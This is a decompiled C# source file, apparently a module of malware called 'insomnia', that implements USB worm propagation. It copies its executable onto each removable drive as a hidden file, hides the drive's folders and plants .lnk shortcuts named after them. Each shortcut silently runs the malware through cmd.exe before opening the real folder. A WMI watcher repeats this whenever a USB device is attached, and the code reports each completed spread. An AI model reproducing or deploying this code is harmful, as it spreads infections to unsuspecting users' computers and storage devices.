using System;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;

namespace insomnia;

internal class Class17
{
	private static ManagementEventWatcher Field1;

	public static void Method4()
	{
		try
		{
			Thread.Sleep(5000);
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.DriveType != DriveType.Removable)
				{
					continue;
				}
				string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(driveInfo.TotalSize + driveInfo.VolumeLabel + driveInfo.DriveFormat + "insomnia")).Replace("=", "").Substring(0, 7)
					.ToLower() + ".exe";
				if (!File.Exists(driveInfo.Name + text))
				{
					File.Copy(Class26.Field20, driveInfo.Name + text, overwrite: true);
					File.SetAttributes(driveInfo.Name + text, FileAttributes.Hidden);
					DirectoryInfo[] directories = new DirectoryInfo(driveInfo.Name).GetDirectories("*.*", SearchOption.TopDirectoryOnly);
					int num = 0;
					DirectoryInfo[] array2 = directories;
					foreach (DirectoryInfo directoryInfo in array2)
					{
						directoryInfo.Attributes = FileAttributes.Hidden;
						Method3(driveInfo.RootDirectory.ToString(), directoryInfo.Name + ".lnk", text, "explorer.exe " + directoryInfo.FullName, directoryInfo.Name);
						num++;
					}
					Class31.Method3("[USB]: Completed LNK spread on (" + driveInfo.Name + ") with " + num + " files.", Class26.Field8);
				}
			}
		}
		catch
		{
		}
		try
		{
			Method2();
		}
		catch
		{
		}
	}

	private static void Method3(string A_0, string A_1, string A_2, string A_3, string A_4)
	{
		using Class2 @class = new Class2();
		@class.Property64 = Environment.SystemDirectory + "\\cmd.exe";
		@class.Property61 = "/c " + A_2 + " & " + A_3;
		@class.Property63 = "%CD%";
		@class.Property62 = A_4;
		@class.Property66 = Environment.SystemDirectory + "\\shell32.dll";
		@class.Property65 = 3;
		@class.Property60 = Class2.Enum5.Field2;
		@class.Method4(A_0 + "\\" + A_1);
	}

	public static void Method2()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		ManagementScope val = new ManagementScope("root\\CIMV2");
		val.get_Options().set_EnablePrivileges(true);
		try
		{
			WqlEventQuery val2 = new WqlEventQuery();
			val2.set_EventClassName("__InstanceCreationEvent");
			val2.set_WithinInterval(new TimeSpan(0, 0, 3));
			val2.set_Condition("TargetInstance ISA 'Win32_USBControllerdevice'");
			Field1 = new ManagementEventWatcher(val, (EventQuery)(object)val2);
			Field1.add_EventArrived(new EventArrivedEventHandler(Method1));
			Field1.Start();
		}
		catch
		{
			if (Field1 != null)
			{
				Field1.Stop();
			}
		}
	}

	public static void Method1(object sender, EventArgs e)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType != DriveType.Removable)
			{
				continue;
			}
			try
			{
				string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(driveInfo.TotalSize + driveInfo.VolumeLabel + driveInfo.DriveFormat + "insomnia")).Replace("=", "").Substring(0, 7)
					.ToLower() + ".exe";
				if (!File.Exists(driveInfo.Name + text))
				{
					File.Copy(Class26.Field20, driveInfo.Name + text, overwrite: true);
					File.SetAttributes(driveInfo.Name + text, FileAttributes.Hidden);
					DirectoryInfo[] directories = new DirectoryInfo(driveInfo.Name).GetDirectories("*.*", SearchOption.TopDirectoryOnly);
					int num = 0;
					DirectoryInfo[] array2 = directories;
					foreach (DirectoryInfo directoryInfo in array2)
					{
						directoryInfo.Attributes = FileAttributes.Hidden;
						Method3(driveInfo.RootDirectory.ToString(), directoryInfo.Name + ".lnk", text, "explorer.exe " + directoryInfo.FullName, directoryInfo.Name);
						num++;
					}
					Class31.Method3("[USB]: Completed LNK spread on (" + driveInfo.Name + ") with " + num + " files.", Class26.Field8);
				}
			}
			catch
			{
			}
		}
	}
}
